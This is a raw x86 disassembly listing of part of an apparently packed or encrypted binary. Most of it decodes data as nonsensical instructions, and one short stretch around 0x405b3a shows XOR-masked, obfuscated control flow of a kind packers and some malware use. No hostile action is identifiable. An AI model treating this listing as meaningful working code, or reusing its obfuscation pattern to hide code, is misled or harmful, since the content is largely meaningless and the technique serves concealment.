  4058dd:	ficomp WORD PTR [eax+ecx*1]
  4058e0:	pop    ds
  4058e1:	xchg   ebx,eax
  4058e2:	sbb    eax,0xf66b0c26
  4058e7:	jmp    0x40590c
  4058e9:	cmp    BYTE PTR [esi-0x57f363dc],dh
  4058ef:	cmp    DWORD PTR [ecx-0x452189b6],0xa6f45148
  4058f9:	xor    dl,BYTE PTR [edx+0x2ae03768]
  4058ff:	jmp    0xfb0b5c83
  405904:	and    ebx,DWORD PTR [edx-0x4e305ada]
  40590a:	and    al,0xed
  40590c:	mov    cl,0x69
  40590e:	push   esp
  40590f:	xor    eax,0xb107ba18
  405914:	ss cdq 
  405916:	or     bh,BYTE PTR [edx-0x12]
  405919:	jno    0x4058b0
  40591b:	pop    eax
  40591c:	rcl    DWORD PTR [ecx],cl
  40591e:	mov    BYTE PTR [edi+eiz*2-0x669bd4e],dl
  405925:	mov    esi,DWORD PTR [eax-0x17738447]
  40592b:	rcl    BYTE PTR [eax-0x5391f401],1
  405931:	mov    ah,0x76
  405933:	popf   
  405934:	ror    edi,1
  405936:	or     al,0xf5
  405938:	pop    es
  405939:	fisttp WORD PTR [eax+0x23]
  40593c:	cmc    
  40593d:	add    BYTE PTR [ebx-0x74b515d5],bh
  405943:	push   es
  405944:	pop    edi
  405945:	std    
  405946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405947:	cld    
  405948:	call   0x8be05d1b
  40594d:	loopne 0x40596b
  40594f:	jae    0x405951
  405951:	jno    0x4059a2
  405953:	jle    0x4058e9
  405955:	sbb    BYTE PTR ds:0xc1d7a2ea,0xc4
  40595c:	popf   
  40595d:	es adc bh,ah
  405960:	or     dh,bl
  405962:	pop    ebp
  405963:	dec    edi
  405964:	dec    eax
  405965:	push   ds
  405966:	test   eax,ecx
  405968:	sahf   
  405969:	jle    0x4059c0
  40596b:	mov    esp,0x89ca788c
  405970:	jae    0x405917
  405972:	and    esi,esp
  405974:	dec    ebp
  405975:	mov    dh,0xf9
  405977:	(bad)  
  405978:	or     DWORD PTR [eax],ebp
  40597a:	inc    eax
  40597b:	leave  
  40597c:	and    al,0x49
  40597e:	mov    BYTE PTR [ebp-0x20692cfd],ch
  405984:	mov    cl,0x6d
  405986:	cwde   
  405987:	aam    0xbc
  405989:	fsub   st(7),st
  40598b:	jmp    0x65190d3e
  405990:	pop    ss
  405991:	rcr    BYTE PTR [eax+0x3b],cl
  405994:	sti    
  405995:	fcom   DWORD PTR [esi+0x1a]
  405998:	dec    ecx
  405999:	mov    ds:0x29a1ff11,al
  40599e:	mov    cl,BYTE PTR [edi-0xfcc7390]
  4059a4:	and    edx,DWORD PTR [edi+0x11b9f2bc]
  4059aa:	lods   eax,DWORD PTR ds:[esi]
  4059ab:	pop    edx
  4059ac:	jns    0x40599f
  4059ae:	xor    DWORD PTR ds:0xa02ed555,edx
  4059b4:	dec    esp
  4059b5:	push   cs
  4059b6:	loopne 0x4059cd
  4059b8:	sub    bh,cl
  4059ba:	scas   al,BYTE PTR es:[edi]
  4059bb:	lds    esi,FWORD PTR [ebx]
  4059bd:	stos   BYTE PTR es:[edi],al
  4059be:	gs push eax
  4059c0:	das    
  4059c1:	dec    eax
  4059c2:	dec    eax
  4059c3:	dec    edi
  4059c4:	xor    al,0x72
  4059c6:	xchg   DWORD PTR [eax],esp
  4059c8:	in     eax,0x3b
  4059ca:	xchg   edx,eax
  4059cb:	sbb    eax,DWORD PTR [edx+0x50]
  4059ce:	cmp    edi,esp
  4059d0:	jmp    0x405965
  4059d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059d3:	retf   0xeff2
  4059d6:	jae    0x405a0f
  4059d8:	out    0xe1,eax
  4059da:	cmp    dh,al
  4059dc:	daa    
  4059dd:	sar    DWORD PTR [ecx-0x1f],cl
  4059e0:	mov    bh,0x17
  4059e2:	xor    bl,BYTE PTR [ecx]
  4059e4:	cmp    cl,BYTE PTR [esp+ecx*1+0x6e65627d]
  4059eb:	inc    edi
  4059ec:	cdq    
  4059ed:	test   BYTE PTR [esi+eax*1-0x68],ah
  4059f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059f2:	and    al,0xb7
  4059f4:	sub    eax,0xed1c2707
  4059f9:	sub    DWORD PTR [ecx],0xffffffc1
  4059fc:	mov    edi,0xd913f0b5
  405a01:	push   eax
  405a02:	shr    eax,cl
  405a04:	and    edx,ecx
  405a06:	clc    
  405a07:	sbb    ebx,0x368369be
  405a0d:	jecxz  0x405a35
  405a0f:	sub    edi,DWORD PTR [ecx+0x216f2895]
  405a15:	scas   eax,DWORD PTR es:[edi]
  405a16:	pop    edi
  405a17:	lds    ebx,FWORD PTR [edx-0x4cb8acbb]
  405a1d:	pop    edx
  405a1e:	(bad)  
  405a20:	mov    esi,0x7133b115
  405a25:	mov    bh,0x1
  405a27:	jmp    ebx
  405a29:	pop    es
  405a2a:	mov    dh,0x6
  405a2c:	mov    al,0x26
  405a2e:	push   esp
  405a2f:	or     BYTE PTR [eax],0x2
  405a32:	mov    ebp,0x5be9fdf4
  405a37:	rcl    bl,0x95
  405a3a:	dec    edx
  405a3b:	xchg   ecx,eax
  405a3c:	push   ecx
  405a3d:	imul   ebx,DWORD PTR [eax-0x48],0x2b069343
  405a44:	out    0x6d,eax
  405a46:	imul   eax,DWORD PTR [edi],0x44c1253e
  405a4c:	dec    edi
  405a4d:	cmp    BYTE PTR [ebp-0x65c2f8c4],bl
  405a53:	rol    ebp,1
  405a55:	inc    BYTE PTR [edi-0x7f]
  405a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a59:	addr16 push 0xffffffe1
  405a5c:	cmp    al,0x61
  405a5e:	mov    eax,ds:0x3fc393b1
  405a63:	aaa    
  405a64:	rcl    DWORD PTR [eax+ebp*8],1
  405a67:	sbb    ebp,edi
  405a69:	je     0x405ac3
  405a6b:	inc    eax
  405a6c:	fadd   QWORD PTR [esi-0x74]
  405a6f:	pop    es
  405a70:	push   ss
  405a71:	fcom   QWORD PTR [ebp-0x7d]
  405a74:	aam    0x60
  405a76:	rol    BYTE PTR [ecx+0x4a1510e9],cl
  405a7c:	sub    eax,0x9da02058
  405a81:	addr16 enter 0xac05,0x16
  405a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a87:	xchg   edx,esi
  405a89:	jecxz  0x405a84
  405a8b:	xchg   ebp,eax
  405a8c:	cli    
  405a8d:	sbb    al,0xfe
  405a8f:	inc    edi
  405a90:	lds    edx,FWORD PTR [edi-0x6d]
  405a93:	(bad)
  405a96:	or     DWORD PTR [edx],esi
  405a98:	cmp    dh,BYTE PTR [ebp+0xb]
  405a9b:	popf   
  405a9c:	int3   
  405a9d:	cld    
  405a9e:	test   dh,cl
  405aa0:	mov    fs,WORD PTR [ebp+ebx*2+0x1dbd9dcb]
  405aa7:	pop    eax
  405aa8:	dec    ecx
  405aa9:	test   DWORD PTR [ebp-0x3e0d5267],eax
  405aaf:	fs push cs
  405ab1:	stos   BYTE PTR es:[edi],al
  405ab2:	pop    edx
  405ab3:	enter  0x21f7,0xbf
  405ab7:	aad    0x3
  405ab9:	ret    0xcda9
  405abc:	popf   
  405abd:	test   DWORD PTR [edi+0x7727e167],0x4643a776
  405ac7:	test   al,0x7a
  405ac9:	lods   al,BYTE PTR ds:[esi]
  405aca:	jg     0x405ac9
  405acc:	mov    BYTE PTR [eax+ecx*4-0x69a9db67],bl
  405ad3:	fwait
  405ad4:	mov    BYTE PTR [ebx],ch
  405ad6:	pop    eax
  405ad7:	cmp    DWORD PTR [eax-0x29818d98],ebx
  405add:	sbb    BYTE PTR [ebx+0x580edb33],ch
  405ae3:	jmp    0x405b3c
  405ae5:	cmp    DWORD PTR [edx-0x7d],ebp
  405ae8:	jmp    0xe22b:0x8761f23d
  405aef:	sub    eax,0xb6c65e20
  405af4:	pop    ss
  405af5:	cmp    al,0xef
  405af7:	test   eax,0xf0bb818b
  405afc:	pushf  
  405afd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405afe:	jne    0x405ab2
  405b00:	sub    BYTE PTR [edi-0x8],0x9a
  405b04:	inc    ebp
  405b05:	pop    esp
  405b06:	xor    cl,bh
  405b08:	loopne 0x405b2b
  405b0a:	cmp    DWORD PTR [esp+esi*4-0x2a],0x76
  405b0f:	(bad)
  405b13:	in     eax,dx
  405b14:	sbb    bh,dh
  405b16:	js     0x405afe
  405b18:	cmp    al,ah
  405b1a:	dec    ebp
  405b1b:	xchg   ecx,eax
  405b1c:	shr    BYTE PTR [edi+eiz*1],cl
  405b1f:	adc    bl,BYTE PTR [edx+0x5a]
  405b22:	push   edx
  405b23:	mov    ebx,0x5e691eb0
  405b28:	in     eax,0xa7
  405b2a:	or     al,0x66
  405b2c:	cli    
  405b2d:	sahf   
  405b2e:	call   0x89ca2eb8
  405b33:	dec    ebp
  405b34:	adc    BYTE PTR [ecx+0xc6d],bh
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43369b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433653,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4336a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4336ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43372f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0xc0f66eb3
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405c22
  405be0:	pop    es
  405be1:	jmp    0x3600d494
  405be6:	test   eax,0xce7a460d
  405beb:	pop    eax
  405bec:	cmp    BYTE PTR [ebx],ah
  405bee:	ffree  st(4)
  405bf0:	in     eax,0xac
  405bf2:	mov    edi,0x44f30ef9
  405bf7:	jbe    0x405bad
  405bf9:	xor    eax,DWORD PTR [edx]
  405bfb:	stc    
  405bfc:	retf   0x22ec
  405bff:	add    BYTE PTR [ecx],dh
  405c01:	cmp    ebp,DWORD PTR [ecx+0x51]
  405c04:	sbb    al,0x2
  405c06:	in     eax,0x90
  405c08:	add    ebp,edx
  405c0a:	dec    edx
  405c0b:	xor    al,0xd0
  405c0d:	out    0xda,ax
  405c10:	cmp    BYTE PTR [edx],dh
  405c12:	fistp  DWORD PTR [ebp-0x6a]
  405c15:	sub    BYTE PTR gs:[edx+0x28c73cd7],0xb8
  405c1d:	out    dx,eax
  405c1e:	jecxz  0x405c82
  405c20:	(bad)  
  405c21:	xor    edx,DWORD PTR [ecx+0x37]
  405c24:	push   ecx
  405c25:	call   0x3842:0xb7eca7a9
  405c2c:	loop   0x405c44
  405c2e:	ss xchg ebp,eax
  405c30:	sbb    BYTE PTR [edi-0x5f],ah
  405c33:	inc    ebx
  405c34:	jge    0x405c69
  405c36:	xchg   ebp,eax
  405c37:	call   0xd172:0xb1c129dd
  405c3e:	add    al,0xb8
  405c40:	sahf   
  405c41:	ret    
  405c42:	(bad)  
  405c44:	xor    ch,BYTE PTR [edi+0x3a]
  405c47:	cmp    al,bl
  405c49:	ret    0x44a7
  405c4c:	mov    bl,0xcf
  405c4e:	ds enter 0x24a9,0xba
  405c53:	mov    cl,0x8b
  405c55:	(bad)  
  405c56:	sub    al,0xe0
  405c58:	sbb    eax,0xc743d9d2
  405c5d:	cs sbb bh,dh
  405c60:	sti    
  405c61:	mov    al,ds:0xc603fe4b
  405c66:	ret    
  405c67:	pop    ss
  405c68:	shl    BYTE PTR [edx+ebx*8-0x106b5215],0x6b
  405c70:	sub    BYTE PTR [ebp+0x17],ah
  405c73:	xchg   ecx,eax
  405c74:	pop    ebx
  405c75:	(bad)  
  405c77:	dec    ebx
  405c78:	jb     0x405c63
  405c7a:	sub    al,0xc0
  405c7c:	cmp    DWORD PTR [ebx-0x26f9d042],edx
  405c82:	loop   0x405cdb
  405c84:	pop    esi
  405c85:	sbb    eax,0xa31b1dc4
  405c8a:	dec    ebx
  405c8b:	les    eax,FWORD PTR [esi-0x55]
  405c8e:	cs cmp edi,eax
  405c91:	nop
  405c92:	or     dl,ch
  405c94:	inc    edi
  405c95:	jbe    0x405c4c
  405c97:	adc    BYTE PTR [edi+0x7f],bh
  405c9a:	and    DWORD PTR [ecx],ebx
  405c9c:	rcr    BYTE PTR [eax+0x38],0x21
  405ca0:	in     eax,dx
  405ca1:	xchg   esi,eax
  405ca2:	xchg   esi,eax
  405ca3:	hlt    
  405ca4:	mov    ebp,0xe39342e4
  405ca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405caa:	sar    DWORD PTR [ecx+0x5bfb8b41],1
  405cb0:	sub    al,0xae
  405cb2:	jl     0x405ce9
  405cb4:	sbb    al,0x81
  405cb6:	shl    bl,0xa4
  405cb9:	jno    0x405c49
  405cbb:	mov    dl,0xfa
  405cbd:	add    ecx,DWORD PTR ds:0x7ff69698
  405cc3:	push   cs
  405cc4:	adc    ecx,ecx
  405cc6:	cli    
  405cc7:	sahf   
  405cc8:	mov    DWORD PTR [eax],edi
  405cca:	jmp    0x405d33
  405ccc:	sar    DWORD PTR [edx*8+0x46265f93],0xef
  405cd4:	cld    
  405cd5:	dec    ebx
  405cd6:	cmp    eax,0x975047d1
  405cdb:	jns    0x405d56
  405cdd:	rol    DWORD PTR [eax],cl
  405cdf:	xor    esi,DWORD PTR [ecx]
  405ce1:	adc    eax,0xf8b1f553
  405ce6:	sbb    edx,esp
  405ce8:	out    dx,eax
  405ce9:	jb     0x405c6d
  405ceb:	dec    esp
  405cec:	dec    edi
  405ced:	popa   
  405cee:	adc    eax,0x8c17c1cd
  405cf3:	or     BYTE PTR [edx+0x3],0xc3
  405cf7:	ror    BYTE PTR [eax],0xaa
  405cfa:	ror    al,cl
  405cfc:	adc    edi,DWORD PTR [edi-0x3eced3f1]
  405d02:	pop    ss
  405d03:	out    dx,eax
  405d04:	lahf   
  405d05:	xor    al,0xfb
  405d07:	sar    BYTE PTR [edx+esi*8+0x32],1
  405d0b:	dec    ebp
  405d0c:	cmp    al,cl
  405d0e:	leave  
  405d0f:	cmp    eax,0x660d2b5b
  405d14:	mov    ah,cl
  405d16:	pop    ss
  405d17:	in     al,0xdc
  405d19:	mov    dh,0x12
  405d1b:	mov    dh,0x10
  405d1d:	and    ecx,DWORD PTR [ecx]
  405d1f:	(bad)  
  405d21:	pop    ebx
  405d22:	push   es
  405d23:	pop    ecx
  405d24:	(bad)  
  405d25:	push   ds
  405d26:	lods   al,BYTE PTR ds:[esi]
  405d27:	xchg   edi,eax
  405d28:	test   eax,0xd3c3ba42
  405d2d:	or     ebp,DWORD PTR [eax]
  405d2f:	stc    
  405d30:	cmc    
  405d31:	and    DWORD PTR [ebp+0x4e],ebx
  405d34:	in     eax,0x25
  405d36:	cmp    edx,DWORD PTR [ebx-0x214d1b07]
  405d3c:	xchg   edi,eax
  405d3d:	or     esi,esp
  405d3f:	xchg   DWORD PTR [ebp+0x350d5261],esp
  405d45:	and    DWORD PTR [ebx+0x2e],esi
  405d48:	cld    
  405d49:	fmul   DWORD PTR [ecx+0x348b4f89]
  405d4f:	push   ds
  405d50:	cmp    esi,ecx
  405d52:	ja     0x405dcc
  405d54:	leave  
  405d55:	lea    esp,[edi+ecx*8+0x52]
  405d59:	push   ebx
  405d5a:	jmp    0x6c8555a0
  405d5f:	sbb    eax,0x859a11b0
  405d64:	mov    ch,0x19
  405d66:	es jae 0x405dab
  405d69:	sub    al,0xf6
  405d6b:	lahf   
  405d6c:	pop    ebp
  405d6d:	xlat   BYTE PTR ds:[ebx]
  405d6e:	push   eax
  405d6f:	jns    0x405d27
  405d71:	xlat   BYTE PTR ds:[ebx]
  405d72:	add    ecx,DWORD PTR [ebx]
  405d74:	cmp    eax,ebx
  405d76:	sbb    bh,BYTE PTR [ebp-0x4f0d41d9]
  405d7c:	ret    0x603d
  405d7f:	aad    0x63
  405d81:	in     eax,dx
  405d82:	mov    bl,0x22
  405d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d85:	mov    ah,0x22
  405d87:	mov    al,ds:0xb0a333a6
  405d8c:	jmp    0x6d52aff4
  405d91:	es sub eax,0x447bb3e7
  405d97:	jae    0x405de8
  405d99:	dec    ebp
  405d9a:	jg     0x405e03
  405d9c:	dec    ebx
  405d9d:	sub    BYTE PTR [ecx],0x72
  405da0:	sbb    al,0xd2
  405da2:	fild   WORD PTR [ebx+0x1b2636e6]
  405da8:	std    
  405da9:	jp     0x405e08
  405dab:	(bad)
  405dae:	ds mov ecx,0xc8939984
  405db4:	pop    edi
  405db5:	outs   dx,BYTE PTR ds:[esi]
  405db6:	jmp    0x31de:0xf005c81c
  405dbd:	gs mov ebx,0xc73190e
  405dc3:	nop
  405dc4:	sbb    cl,0x1c
  405dc7:	xchg   BYTE PTR [ebx-0x72d40269],dh
  405dcd:	jns    0x405d5b
  405dcf:	les    edi,FWORD PTR [eax]
  405dd1:	sub    DWORD PTR [edx+esi*2],ebp
  405dd4:	or     al,al
  405dd6:	push   ds
  405dd7:	out    0xc8,al
  405dd9:	xchg   ebx,eax
  405dda:	ret    0x68df
  405ddd:	adc    al,0x7d
  405ddf:	dec    esi
  405de0:	dec    ebx
  405de1:	mov    cl,0xf0
  405de3:	jl     0x405d81
  405de5:	jmp    0x405d71
  405de7:	int    0xb3
  405de9:	test   BYTE PTR [ecx],0xec
  405dec:	or     DWORD PTR [eax],esi
  405dee:	aam    0xf7
  405df0:	pop    esi
  405df1:	mov    WORD PTR [esi-0x6f],ss
  405df4:	mov    esi,0x44337d1b
  405df9:	adc    eax,0xe69a9ad8
  405dfe:	xchg   esi,eax
  405dff:	mov    DWORD PTR ds:0xf773a072,ebx
  405e05:	add    edi,esp
  405e07:	repnz bound ebp,QWORD PTR [ebx]
  405e0a:	xor    BYTE PTR [edi+0x3d6d1f1f],dh
  405e10:	adc    DWORD PTR [edi],0xe6b45215
  405e16:	inc    ecx
  405e17:	sbb    eax,0x6e60a4f6
  405e1c:	stos   DWORD PTR es:[edi],eax
  405e1d:	add    dl,al
  405e1f:	(bad)  
  405e20:	or     esp,esp
  405e22:	lahf   
  405e23:	lds    ebp,FWORD PTR [esi+ebx*1]
  405e26:	aaa    
  405e27:	in     al,0xd3
  405e29:	inc    eax
  405e2a:	xor    ebx,edx
  405e2c:	loop   0x405e0e
  405e2e:	mov    ds:0x54ee2854,al
  405e33:	xor    dl,BYTE PTR [ebp+0x57bb1f10]
  405e39:	cdq    
  405e3a:	mov    dh,0x14
  405e3c:	cli    
  405e3d:	out    0xa0,eax
  405e3f:	jns    0x405e61
  405e41:	xor    BYTE PTR [edi],bl
  405e43:	out    dx,al
  405e44:	scas   al,BYTE PTR es:[edi]
  405e45:	ins    BYTE PTR es:[edi],dx
  405e46:	mov    dl,0xd2
  405e48:	outs   dx,BYTE PTR ds:[esi]
  405e49:	mov    bh,0x2f
  405e4b:	jmp    0x533b107b
  405e50:	test   eax,0x6a84ac58
  405e55:	sub    DWORD PTR [eax],ebx
  405e57:	(bad)  
  405e58:	lods   eax,DWORD PTR ds:[esi]
  405e59:	adc    bh,BYTE PTR [ecx-0x24075c35]
  405e5f:	sbb    al,0x38
  405e61:	mov    dl,BYTE PTR [esp+edi*1-0x43b104ca]
  405e68:	aad    0x9c
  405e6a:	stos   DWORD PTR es:[edi],eax
  405e6b:	inc    edx
  405e6c:	adc    bl,BYTE PTR [ebp+0x5d]
  405e6f:	lock sahf 
  405e71:	adc    edi,ebp
  405e73:	dec    edx
  405e74:	adc    eax,0x3cc337e2
  405e79:	jle    0x405e16
  405e7b:	ins    BYTE PTR es:[edi],dx
  405e7c:	cs jge 0x405ef3
  405e7f:	xchg   esp,eax
  405e80:	(bad)  
  405e81:	xchg   edi,eax
  405e82:	or     ebx,0x49df948f
  405e88:	mov    edi,0x94f9dc2b
  405e8d:	icebp  
  405e8e:	sub    ebx,ecx
  405e90:	hlt    
  405e91:	and    esp,DWORD PTR [eax-0xbeb37de]
  405e97:	pop    DWORD PTR [eax+eax*2+0x5ec135a]
  405e9e:	mov    al,ds:0xbf6468a
  405ea3:	push   ds
  405ea4:	cmovb  esp,DWORD PTR [eax+0x4388bbc2]
  405eab:	jb     0x405eb0
  405ead:	and    eax,0xff74da31
  405eb2:	sbb    ecx,DWORD PTR [ebx-0x667c3860]
  405eb8:	(bad)  
  405eb9:	lods   al,BYTE PTR ds:[esi]
  405eba:	mov    ebp,0xd98ec247
  405ebf:	rcl    al,0xca
  405ec2:	js     0x405efe
  405ec4:	ins    BYTE PTR es:[edi],dx
  405ec5:	out    0xfc,eax
  405ec7:	stos   BYTE PTR es:[edi],al
  405ec8:	push   edx
  405ec9:	sub    DWORD PTR [esi-0x46a2285d],eax
  405ecf:	fbld   TBYTE PTR [edi+0x22]
  405ed2:	ins    BYTE PTR es:[edi],dx
  405ed3:	test   al,0xa7
  405ed5:	or     eax,0xbfa9c70c
  405eda:	div    DWORD PTR [ebx+0x3faa015d]
  405ee0:	fild   QWORD PTR [ebx]
  405ee2:	mov    DWORD PTR [ebp-0x26],ebx
  405ee5:	mov    eax,ds:0x81a211ef
  405eea:	sub    eax,DWORD PTR [esi+0x3c9b1ed0]
  405ef0:	mov    ah,0x88
  405ef2:	mov    ah,0x33
  405ef4:	rcr    BYTE PTR [eax-0x4a],0xff
  405ef8:	sub    edx,DWORD PTR [ebx]
  405efa:	sbb    ebp,DWORD PTR [edx-0x58ba939e]
  405f00:	xchg   edi,eax
  405f01:	add    dh,dh
  405f03:	add    eax,DWORD PTR [edx*1-0x2d5561d3]
  405f0a:	outs   dx,BYTE PTR ds:[esi]
  405f0b:	jmp    0x46992dc6
  405f10:	pop    eax
  405f11:	xor    esi,ecx
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [ecx-0x3d],cs
  405f28:	sub    DWORD PTR [esi],ebp
  405f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	pop    ebp
  405f33:	fs mov esi,0x624499ab
  405f39:	and    eax,0x1d205abd
  405f3e:	mov    cl,0x6
  405f40:	nop
  405f41:	ja     0x405f32
  405f43:	dec    esp
  405f44:	cmp    al,0x4b
  405f46:	in     eax,0x2
  405f48:	mov    ds:0xc5a2620d,eax
  405f4d:	inc    ecx
  405f4e:	mov    DWORD PTR [eax+0x76498f29],0x12b63fe1
  405f58:	inc    ebx
  405f59:	mov    WORD PTR [edi+edi*8],cs
  405f5c:	out    dx,al
  405f5d:	div    DWORD PTR [ebx+0xc4824aa]
  405f63:	jg     0x405fdd
  405f65:	adc    eax,0x30a0577f
  405f6a:	test   eax,0xcc784487
  405f6f:	neg    DWORD PTR [esi-0x4453f167]
  405f75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f76:	mov    ecx,0xc6d27d26
  405f7b:	mov    esi,0x9cc2d8a6
  405f81:	xor    al,0x80
  405f83:	pop    esi
  405f84:	lock cmp dh,BYTE PTR [ebx]
  405f87:	add    eax,0x5e0f7f61
  405f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f8d:	adc    al,dl
  405f8f:	jl     0x405f59
  405f91:	pop    ecx
  405f92:	rcl    BYTE PTR [edi],1
  405f94:	inc    BYTE PTR [eax+0x4202913c]
  405f9a:	push   ds
  405f9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f9c:	adc    al,0x45
  405f9e:	or     edi,DWORD PTR [edx+0x173ebbd3]
  405fa4:	inc    edi
  405fa5:	mov    eax,0xbbfe5c00
  405faa:	cmp    al,0xb0
  405fac:	cld    
  405fad:	dec    eax
  405fae:	scas   al,BYTE PTR es:[edi]
  405faf:	pop    eax
  405fb0:	sub    eax,0x73d0628a
  405fb5:	cmp    al,0x7e
  405fb7:	retf   0x1d50
  405fba:	out    0x10,eax
  405fbc:	jo     0x405fec
  405fbe:	outs   dx,BYTE PTR ds:[esi]
  405fbf:	sub    BYTE PTR [edi],0xbf
  405fc2:	mov    dh,ch
  405fc4:	fisttp QWORD PTR [ecx]
  405fc6:	outs   dx,DWORD PTR ds:[esi]
  405fc7:	mov    dh,0x46
  405fc9:	lods   eax,DWORD PTR ds:[esi]
  405fca:	out    0xba,al
  405fcc:	pushf  
  405fcd:	inc    esi
  405fce:	push   esp
  405fcf:	dec    esp
  405fd0:	test   DWORD PTR [edi-0x426c4bf2],esi
  405fd6:	add    dl,BYTE PTR [edi]
  405fd8:	pop    esp
  405fd9:	mov    cl,0xcd
  405fdb:	inc    ecx
  405fdc:	cld    
  405fdd:	shl    DWORD PTR ds:0x752ab66,cl
  405fe3:	call   FWORD PTR [edx]
  405fe5:	adc    al,0xb8
  405fe7:	jne    0x40600b
  405fe9:	adc    al,0x70
  405feb:	dec    ebp
  405fec:	pop    eax
  405fed:	jmp    0x17cefb80
  405ff2:	sub    eax,0x96b55dd9
  405ff7:	sub    ecx,edi
  405ff9:	jnp    0x405f8f
  405ffb:	dec    ebp
  405ffc:	pusha  
  405ffd:	sbb    BYTE PTR cs:[esi],ah
  406000:	sbb    ebx,esi
  406002:	imul   ebx,DWORD PTR [edx+0x10],0x25
  406006:	sar    ecx,0x98
  406009:	cmc    
  40600a:	mov    esp,0x8ff8aa63
  40600f:	in     eax,0x4f
  406011:	cmp    edx,eax
  406013:	mov    esi,0x40c2bbf7
  406018:	retf   
  406019:	sbb    eax,0xfb237db1
  40601e:	jb     0x405fc8
  406020:	inc    ebp
  406021:	fisub  WORD PTR [ebp+eiz*2-0x599c29e8]
  406028:	loopne 0x405fbc
  40602a:	xchg   DWORD PTR [ebx],esi
  40602c:	mov    ch,0x73
  40602e:	dec    ebx
  40602f:	inc    esi
  406030:	ficom  DWORD PTR [edx+ebp*2-0x133dc931]
  406037:	push   ebp
  406038:	or     ecx,DWORD PTR [edx+0x6f]
  40603b:	pushf  
  40603c:	and    eax,0x308247a2
  406041:	sbb    ebp,DWORD PTR [edi]
  406043:	jae    0x406057
  406045:	retf   0xfc63
  406048:	mov    BYTE PTR [edx+0x5eeeb451],ah
  40604e:	ret    
  40604f:	sbb    ecx,ebp
  406051:	pop    ss
  406052:	xor    al,0x93
  406054:	dec    ecx
  406055:	pop    edi
  406056:	add    edx,eax
  406058:	rcr    BYTE PTR [edi],0xb3
  40605b:	lods   eax,DWORD PTR ds:[esi]
  40605d:	ja     0x406075
  40605f:	lahf   
  406060:	adc    edi,ebp
  406062:	(bad)  
  406063:	adc    al,0x2f
  406065:	lock fisubr WORD PTR [ebx+0x1d]
  406069:	shl    DWORD PTR [esi+0x3],1
  40606c:	std    
  40606d:	adc    BYTE PTR [ecx-0x6b42a650],0x5b
  406074:	lock push edi
  406076:	xchg   edi,eax
  406077:	push   0x7c5ae58
  40607c:	(bad)  
  40607d:	(bad)  
  40607e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40607f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406080:	arpl   WORD PTR [ecx],di
  406082:	fist   WORD PTR [edx+ebp*8-0x7fbe7832]
  406089:	js     0x406048
  40608b:	into   
  40608c:	sub    cl,BYTE PTR [esi+0x4b9d4e0a]
  406092:	xchg   ebx,eax
  406093:	sub    ebp,DWORD PTR [eax+0x13d0f718]
  406099:	inc    BYTE PTR [edi-0x6eae6993]
  40609f:	xchg   esi,eax
  4060a0:	and    BYTE PTR [ecx+0x79],0xad
  4060a4:	test   DWORD PTR [eax+0x58ebf1cc],ebx
  4060aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060ab:	into   
  4060ac:	aad    0xa
  4060ae:	fist   DWORD PTR [edi]
  4060b0:	jp     0x40606c
  4060b2:	and    al,0x8a
  4060b4:	push   esi
  4060b5:	and    edx,ebx
  4060b7:	mov    al,ds:0x276537b6
  4060bc:	add    bh,ah
  4060be:	(bad)  
  4060bf:	test   edi,0x99648bad
  4060c5:	mov    ax,?
  4060c8:	cld    
  4060c9:	jl     0x406138
  4060cb:	popa   
  4060cc:	call   0x2f477f0d
  4060d1:	(bad)  
  4060d2:	push   ecx
  4060d3:	pop    ss
  4060d4:	jae    0x4060cb
  4060d6:	cmp    al,0x9d
  4060d8:	jo     0x406148
  4060da:	xchg   edi,eax
  4060db:	pop    ds
  4060dc:	xchg   edi,eax
  4060dd:	inc    esp
  4060de:	mov    WORD PTR [eax],gs
  4060e0:	mov    WORD PTR [eax+0x18fe02e0],?
